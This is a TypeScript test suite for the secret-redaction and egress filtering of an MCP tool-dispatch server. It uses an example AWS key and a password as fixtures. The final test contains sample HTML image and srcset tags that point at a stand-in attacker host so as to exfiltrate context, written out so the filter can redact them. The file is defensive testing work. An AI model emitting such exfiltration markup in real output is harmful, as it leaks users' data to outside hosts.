import { expect, test } from "bun:test";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { mergeMcpConfig } from "./config";
import { buildDiscovery } from "./discovery";
import { dispatchCallTool, dispatchReadResource, type McpContext } from "./dispatch";
import type { ToolEntry } from "./types";

const SECRET = "AKIAIOSFODNN7EXAMPLE";
const NUMERIC_PASSWORD = 123456789;

type RedactionMeta = {
  redaction?: { state: "none" | "redacted" | "format-unsafe"; reasons: string[] };
};

async function workspace(): Promise<string> {
  const root = await mkdtemp(path.join(tmpdir(), "keryx-structural-redaction-"));
  await mkdir(path.join(root, ".metaproject"), { recursive: true });
  await writeFile(
    path.join(root, ".metaproject", "metaproject.json"),
    JSON.stringify({ modules: { security: { enabled: true }, mcp: { enabled: true } } }),
    "utf8",
  );
  return root;
}

function context(root: string, invoke: ToolEntry["invoke"]): McpContext {
  return {
    cwd: root,
    config: mergeMcpConfig({ redactToolOutput: true }),
    discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
    transport: "in-process",
    tools: [{
      name: "synthetic.output",
      module: "standard",
      description: "Synthetic output fixture",
      inputSchema: { type: "object" },
      mutating: false,
      invoke,
    }],
  };
}

test("MCP JSON redaction preserves safe numeric metrics and IDs while masking a true secret under a safe-looking field", async () => {
  const root = await workspace();
  try {
    const result = await dispatchCallTool(
      context(root, async () => ({
        schemaVersion: 1,
        count: 123456789012345,
        ratio: 0.875,
        buildId: "build-20260906-123456789012345",
        metric: SECRET,
      })),
      "synthetic.output",
      {},
    ) as Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;
    const payload = JSON.parse(result.text) as Record<string, unknown>;

    expect(result.isError).toBe(false);
    expect(result.redaction?.state).toBe("redacted");
    expect(payload).toMatchObject({
      schemaVersion: 1,
      count: 123456789012345,
      ratio: 0.875,
      buildId: "build-20260906-123456789012345",
      metric: "[REDACTED:secret]",
    });
    expect(result.text).not.toContain(SECRET);
    expect(payload).not.toHaveProperty("redaction");
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("MCP reports format-unsafe instead of corrupting a required numeric secret field", async () => {
  const root = await workspace();
  try {
    const result = await dispatchCallTool(
      context(root, async () => ({ schemaVersion: 1, password: NUMERIC_PASSWORD, count: 7 })),
      "synthetic.output",
      {},
    ) as Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;

    expect(result.isError).toBe(true);
    expect(result.redaction?.state).toBe("format-unsafe");
    expect(result.redaction?.reasons.join("\n")).toMatch(/numeric|schema|format/i);
    expect(result.text).toMatch(/format-unsafe/i);
    expect(result.text).not.toContain(String(NUMERIC_PASSWORD));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("MCP removes secrets from thrown errors and text resources", async () => {
  const root = await workspace();
  try {
    const errorResult = await dispatchCallTool(
      context(root, async () => { throw new Error(`provider failed with ${SECRET}`); }),
      "synthetic.output",
      {},
    ) as Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;
    const wiki = path.join(root, ".metaproject", "wiki");
    await mkdir(wiki, { recursive: true });
    await writeFile(path.join(wiki, "secret.md"), `token=${SECRET}\n`, "utf8");
    const resource = await dispatchReadResource(
      { ...context(root, async () => null), config: mergeMcpConfig({ resources: { roots: ["wiki"] } }) },
      "metaproject://wiki/secret.md",
    ) as Awaited<ReturnType<typeof dispatchReadResource>> & RedactionMeta;

    expect(resource.text).not.toContain(SECRET);
    expect(resource.text).toContain("[REDACTED:secret]");
    expect(resource.redaction?.state).toBe("redacted");
    expect(errorResult.isError).toBe(true);
    expect(errorResult.text).not.toContain(SECRET);
    expect(errorResult.redaction?.state).toBe("redacted");
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("MCP secret floor applies with advisory redaction disabled and unknown caller tool names", async () => {
  const root = await workspace();
  try {
    const ctx = context(root, async () => ({ value: SECRET, safe: "keep" }));
    ctx.config.redactToolOutput = false;
    const result = await dispatchCallTool(ctx, "synthetic.output", {});
    expect(result.text).not.toContain(SECRET);
    expect(JSON.parse(result.text)).toMatchObject({ safe: "keep" });
    const unknown = await dispatchCallTool(ctx, SECRET, {});
    expect(unknown.isError).toBe(true);
    expect(unknown.text).not.toContain(SECRET);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("MCP refuses a redacted value that violates its declared output schema", async () => {
  const root = await workspace();
  try {
    const ctx = context(root, async () => ({ value: SECRET }));
    ctx.tools[0]!.outputSchema = {
      type: "object", required: ["value"], additionalProperties: false,
      properties: { value: { type: "string", enum: [SECRET] } },
    };
    const result = await dispatchCallTool(ctx, "synthetic.output", {});
    expect(result.isError).toBe(true);
    expect(result.redaction.state).toBe("format-unsafe");
    expect(result.text).not.toContain(SECRET);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

// T24R#F-004 / T32: the reviewer demonstrated the following at the real MCP
// transport with a throwaway probe (T24-recheck-boundary.ts). These pin the
// same shapes as committed regressions so a future change to dispatch.ts or
// the redact seam cannot silently regress the boundary while the pure
// validator suite (output-validation.test.ts) stays green.
const FORMAT_UNSAFE_TEXT = "Output withheld: format-unsafe";

test("MCP returns format-unsafe with the fixed property-name reason when a tool result's property name carries a credential, leaking it nowhere", async () => {
  const root = await workspace();
  try {
    const topLevel = await dispatchCallTool(
      context(root, async () => ({ [SECRET]: "safe" })),
      "synthetic.output",
      {},
    ) as Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;
    const nested = await dispatchCallTool(
      context(root, async () => ({ rows: [{ meta: { [SECRET]: 1 } }] })),
      "synthetic.output",
      {},
    ) as Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;

    for (const result of [topLevel, nested]) {
      expect(result.isError).toBe(true);
      expect(result.redaction?.state).toBe("format-unsafe");
      expect(result.redaction?.reasons).toEqual(["sensitive-property-name"]);
      expect(result.text).toBe(FORMAT_UNSAFE_TEXT);
      // The credential must appear nowhere in the transported payload OR its
      // sibling metadata — serialize the whole result, not just `text`.
      expect(JSON.stringify(result)).not.toContain(SECRET);
    }
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("MCP refuses a declared output schema using a local $ref together with a supported validation sibling, with the fixed reference-sibling reason", async () => {
  const root = await workspace();
  try {
    const refSiblingCtx = context(root, async () => "short");
    refSiblingCtx.tools[0]!.outputSchema = {
      $defs: { base: { type: "string" } },
      $ref: "#/$defs/base",
      minLength: 20,
    };
    const refused = await dispatchCallTool(refSiblingCtx, "synthetic.output", {}) as
      Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;

    expect(refused.isError).toBe(true);
    expect(refused.redaction?.state).toBe("format-unsafe");
    expect(refused.redaction?.reasons).toEqual(["schema.unsupported-reference-siblings"]);
    expect(refused.text).toBe(FORMAT_UNSAFE_TEXT);

    // Control: a bare $ref beside its $defs container carries no unsupported
    // sibling and must stay supported — this closure must not become "any $ref
    // fails".
    const refDefsCtx = context(root, async () => "ok");
    refDefsCtx.tools[0]!.outputSchema = {
      $ref: "#/$defs/base",
      $defs: { base: { type: "string" } },
    };
    const allowed = await dispatchCallTool(refDefsCtx, "synthetic.output", {}) as
      Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;
    expect(allowed.isError).toBe(false);
    expect(allowed.redaction?.state).toBe("none");
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("MCP treats an entity-encoded image src and every srcset candidate as auto-fetch while an ordinary public link in the same payload is untouched", async () => {
  const root = await workspace();
  try {
    const attackerHost = "attacker.invalid";
    const result = await dispatchCallTool(
      context(root, async () => ({
        entityImage: `<img src="https&#58;//${attackerHost}/pixel?p=ctx">`,
        srcsetImage: `<img srcset="https://${attackerHost}/pixel?p=1 1x, https://${attackerHost}/pixel?p=2 2x">`,
        publicLink: "[public documentation](https://docs.example.org/guide)",
      })),
      "synthetic.output",
      {},
    ) as Awaited<ReturnType<typeof dispatchCallTool>> & RedactionMeta;
    const payload = JSON.parse(result.text) as Record<string, string>;

    expect(result.isError).toBe(false);
    expect(result.redaction?.state).toBe("redacted");
    expect(result.redaction?.reasons).toEqual(["egress.html-image-exfil"]);
    expect(payload.entityImage).not.toContain(attackerHost);
    expect(payload.entityImage).toContain("[REDACTED:url]");
    expect(payload.srcsetImage).not.toContain(attackerHost);
    expect(payload.srcsetImage).toContain("[REDACTED:url]");
    expect(payload.publicLink).toBe("[public documentation](https://docs.example.org/guide)");
    expect(result.text).not.toContain(attackerHost);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
